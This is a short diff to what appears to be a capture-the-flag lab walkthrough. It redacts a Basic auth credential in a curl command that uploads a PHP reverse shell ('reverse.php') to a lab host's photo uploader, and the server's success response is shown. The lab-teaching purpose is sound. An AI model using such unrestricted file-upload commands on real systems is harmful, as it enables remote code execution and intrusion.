@@ -359,7 +359,7 @@ $ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
 - Now upload using the exploit code, just change the file name alone
 
 ```bash
-$ curl -F "file=@reverse.php" -F "plupload=1" -F "name=reverse.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php" -H "Authorization: Basic ZGV2ZWxvcGVyczo5OTcyNzYxZHJtZnNscw=="
+$ curl -F "file=@reverse.php" -F "plupload=1" -F "name=reverse.php" "http://broadcast.vulnnet.thm/actions/photo_uploader.php" -H "Authorization: Basic REDACTED"
 
 {"success":"yes","file_name":"16217114086733f6","extension":"php","file_directory":"2021\/05\/22"}
 ```
